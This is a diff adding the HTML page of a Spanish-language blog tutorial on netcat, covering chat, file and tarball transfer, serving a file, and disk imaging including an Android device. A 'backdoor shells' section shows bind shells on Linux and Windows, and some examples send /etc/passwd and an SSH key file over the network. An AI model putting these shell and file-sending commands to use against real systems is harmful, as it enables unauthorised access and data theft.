@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+
+  <title>Uso de netcat</title>
+
+  <meta name="author" content="Out of Memory" />
+
+  
+
+  <link rel="alternate" type="application/rss+xml" title="outofmemory.io - You can't always apt-get what you want" href="http://localhost:4000/feed.xml" />
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    
+      <link rel="stylesheet" href="/css/bootstrap-social.css" />
+    
+      <link rel="stylesheet" href="/css/main.css" />
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+    
+  
+
+  
+
+  
+
+  
+
+    <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Uso de netcat" />
+  
+
+   
+  <meta property="og:description" content="netcat Netcat es una utilidad que permite el envío y recepción de datos vía TCP/UDP desde la consola. Inicialmente desarrollada para Unix, se ha portado al menos a Windows y OS X. Hay varios forks con distintas capacidades; en resumen, está en todas partes y sirve para… muchas cositas. Sintaxis...">
+  
+
+
+  <meta property="og:type" content="website" />
+
+  
+  <meta property="og:url" content="http://localhost:4000/2015-06-08-netcat-primer/" />
+  <link rel="canonical" href="http://localhost:4000/2015-06-08-netcat-primer/" />
+  
+
+  
+  <meta property="og:image" content="http://localhost:4000/img/spectrum.png" />
+  
+
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@" />
+  <meta name="twitter:creator" content="@" />
+
+  
+  <meta name="twitter:title" content="Uso de netcat" />
+  
+
+  
+  <meta name="twitter:description" content="netcat Netcat es una utilidad que permite el envío y recepción de datos vía TCP/UDP desde la consola. Inicialmente desarrollada para Unix, se ha portado al menos a Windows y OS X. Hay varios forks con distintas capacidades; en resumen, está en todas partes y sirve para… muchas cositas. Sintaxis...">
+  
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/img/spectrum.png" />
+  
+
+  
+
+  
+
+</head>
+
+
+  <body>
+
+    
+
+
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button><a class="navbar-brand" href="http://localhost:4000/">outofmemory.io</a></div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+          <li><a href="/about">About</a></li></ul>
+    </div>
+
+	
+	<div class="avatar-container">
+	  <div class="avatar-img-border">
+	    <a href="http://localhost:4000/">
+	      <img class="avatar-img" src="/img/spectrum.png" />
+		</a>
+	  </div>
+	</div>
+	
+
+  </div>
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Uso de netcat</h1>
+		  
+		  
+		  
+		  <span class="post-meta">Posted on June 8, 2015</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="netcat">netcat</h2>
+
+<p>Netcat es una utilidad que permite el envío y recepción de datos vía TCP/UDP desde la consola. Inicialmente desarrollada para Unix, se ha portado al menos a Windows y OS X. Hay varios <em>forks</em> con distintas capacidades; en resumen, está en todas partes y sirve para… muchas cositas.</p>
+
+<h2 id="sintaxis">Sintaxis</h2>
+
+<p>De la versión instalada por defecto en Debian Jessie:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@jessie:~# nc <span class="nt">-h</span>
+<span class="o">[</span>v1.10-41]
+connect to somewhere:	nc <span class="o">[</span><span class="nt">-options</span><span class="o">]</span> hostname port[s] <span class="o">[</span>ports] ...
+listen <span class="k">for </span>inbound:	nc <span class="nt">-l</span> <span class="nt">-p</span> port <span class="o">[</span><span class="nt">-options</span><span class="o">]</span> <span class="o">[</span>hostname] <span class="o">[</span>port]
+options:
+	<span class="nt">-c</span> shell commands	as <span class="sb">`</span><span class="nt">-e</span><span class="s1">'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
+	-b			allow broadcasts
+	-g gateway		source-routing hop point[s], up to 8
+	-G num			source-routing pointer: 4, 8, 12, ...
+	-h			this cruft
+	-i secs			delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-o file			hex dump of traffic
+	-p port			local port number
+	-r			randomize local and remote ports
+	-q secs			quit after EOF on stdin and delay of secs
+	-s addr			local source address
+	-T tos			set Type Of Service
+	-t			answer TELNET negotiation
+	-u			UDP mode
+	-v			verbose [use twice to be more verbose]
+	-w secs			timeout for connects and final net reads
+	-C			Send CRLF as line-ending
+	-z			zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. '</span>ftp<span class="se">\-</span>data<span class="s1">').
+</span></code></pre></div></div>
+
+<p>Con las opciones mínimas, <code class="highlighter-rouge">netcat</code> abrirá una conexión TCP (UDP si se utiliza la opción <code class="highlighter-rouge">-u</code>) al host y puerto indicado. Tened en cuenta que, en general, <code class="highlighter-rouge">nc</code> y <code class="highlighter-rouge">netcat</code> son alias del mismo comando (vamos, que se puede usar uno u otro indistintamente).</p>
+
+<h2 id="comunicación-a-través-de-netcat">Comunicación a través de netcat</h2>
+
+<p>Uno de los usos más habituales es el establecimiento de conexiones entre dos sistemas -dos <em>netcats</em>- en modo cliente-servidor. Para ello, tenemos que hacer escuchar a una máquina (opción -l) en el puerto pertinente mientras enviamos datos desde la otra.</p>
+
+<p>Por ejemplo, nos ponemos a escuchar en el puerto 8090…</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@rxhost-a# netcat <span class="nt">-l</span> <span class="nt">-p</span> 8090
+</code></pre></div></div>
+
+<p>…y transmitimos desde otro sistema a ese puerto:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@txhost-b# nc rxhost-a 8090
+</code></pre></div></div>
+
+<p>Si ahora escribimos algo en la consola de txhost-a, aparecerá en la de rxhost-b. Muy bien, pero la gracia está en que esto permite enviar ficheros. Por ejemplo, supongamos que queremos transferir el contenido de un fichero arbitrario desde txhost-b a rxhost-a. Pues haremos lo siguiente en el host donde lo vamos a recibir:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@rxhost-a# netcat <span class="nt">-l</span> <span class="nt">-p</span> 8090 <span class="o">&gt;</span> recibido.txt
+</code></pre></div></div>
+
+<p>y lo transmitimos:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@txhost-b# netcat rxhost-a 8090 &lt; /etc/passwd
+</code></pre></div></div>
+
+<p>Utilizando <em>pipes</em> podremos hacer cosas interesantes, como enviar ficheros o directorios completos en un <em>tarball</em>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@rxhost-a# netcat <span class="nt">-l</span> <span class="nt">-p</span> 8090 | <span class="nb">tar </span>zxvf -
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@txhost-b# <span class="nb">tar</span> <span class="nt">-czf</span> - <span class="k">*</span> | netcat rxhost-a 8090
+</code></pre></div></div>
+
+<p>Otra forma es utilizando <code class="highlighter-rouge">dd</code>, que permite enviar no ya ficheros, sino dispositivos de bloque enteros. Por ejemplo, una adquisición forense de un disco, un backup bit a bit…</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@rxhost-a# netcat <span class="nt">-l</span> <span class="nt">-p</span> 8090 <span class="o">&gt;</span>id_rsa.pub
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@txhost-b# dd <span class="k">if</span><span class="o">=</span>.ssh/id_rsa.pub | nc rxhost-a 8090
+</code></pre></div></div>
+
+<p>Se puede servir un fichero vía “web”:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@hosta:~# nc <span class="nt">-l</span> <span class="nt">-p</span> 80 &lt;index.html
+GET / HTTP/1.1
+Host: 192.168.56.100
+User-Agent: curl/7.49.1
+Accept: <span class="k">*</span>/<span class="k">*</span>
+</code></pre></div></div>
+
+<p>Y, en el otro extemo recibirlo:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@hostb:~$ curl 192.168.56.100:80
+&lt;h1&gt;Hola, mundo!&lt;/h1&gt;
+</code></pre></div></div>
+
+<p>Otro clásico: <em>backdoor shells</em></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@host-a:~<span class="nv">$ </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 8090 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p>¡También en Windows!</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\&gt;</span> nc <span class="nt">-l</span> <span class="nt">-p</span> 8090 <span class="nt">-e</span> cmd.exe
+</code></pre></div></div>
+
+<p>En el sistema remoto:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@host-a:~<span class="nv">$ </span>nc host-a <span class="nt">-p</span> 8090
+hostname
+host-b
+</code></pre></div></div>
+
+<p>Más adelante añadiré otro post con cosas sobre shells inversas…</p>
+
+<p>Un poquito más complejo: extracción del disco completo de un dispositivo Android. Partimos de un dispositivo <em>rooteado</em> (necesitaremos acceder al disco en modo bloque con <code class="highlighter-rouge">dd</code>) y conectado vía USB con <code class="highlighter-rouge">adb</code>. El dispositivo móvil tiene <code class="highlighter-rouge">busybox</code> instalado.</p>
+
+<p>Primero, haremos forward de un socket mediante adb usando un puerto arbitrario:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>santoku@santoku:~<span class="nv">$ </span>adb forward tcp:8888 tcp:8888
+santoku@santoku:~<span class="nv">$ </span>nc 127.0.0.1 8888 <span class="o">&gt;</span> dd.img
+</code></pre></div></div>
+
+<p>En el dispositivo (vía shell):</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>santoku@santoku:~<span class="nv">$ </span>adb shell
+shell@android:/ <span class="nv">$ </span>su
+shell@android:/ <span class="c"># dd if=/dev/block/mmcblk0 | busybox nc -l -p 8888</span>
+</code></pre></div></div>
+
+<p>Y a esperar que se transfiera…</p>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+          
+            <a href="/tags#netcat">netcat</a>
+          
+            <a href="/tags#nc">nc</a>
+          
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Uso+de+netcat&url=http%3A%2F%2Flocalhost%3A4000%2F2015-06-08-netcat-primer%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        <li class="previous">
+          <a href="/2015-02-28-test-markdown/" data-toggle="tooltip" data-placement="top" title="Test markdown">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="next">
+          <a href="/2016-11-12-reverse-shell-cheat-sheet/" data-toggle="tooltip" data-placement="top" title="Reverse shells">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+          
+        <div class="staticman-comments">
+          
+
+        </div>
+        <div class="justcomments-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    <footer>
+  <div class="container beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links"><li><a href="/feed.xml" title="RSS"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">RSS</span>
+              </a>
+            </li><li><a href="mailto:outofmemory.io@protonmail.com" title="Email me"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Email me</span>
+              </a>
+            </li><li><a href="https://github.com/lmarqueta" title="GitHub"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">GitHub</span>
+              </a>
+            </li><li><a href="https://twitter.com/outofmemory_io" title="Twitter"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Twitter</span>
+              </a>
+            </li></ul>
+      <p class="copyright text-muted">
+      Out of Memory
+      &nbsp;&bull;&nbsp;
+      2019
+
+      
+      &nbsp;&bull;&nbsp;
+      <a href="http://localhost:4000/">outofmemory.io</a>
+      
+
+      
+      </p>
+          <!-- Please don't remove this, keep my open source work credited :) -->
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script>
+      	if (typeof jQuery == 'undefined') {
+          document.write('<script src="/js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+      	}
+      </script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/js/bootstrap.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/js/main.js"></script>
+    
+  
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+  <script>
+  window.cookieconsent.initialise({
+    "palette": {
+      "popup": {
+        "background": "#252e39"
+      },
+      "button": {
+        "background": "#14a7d0"
+      }
+    },
+    "theme": "classic"
+  });
+  </script>
+  </body>
+</html>
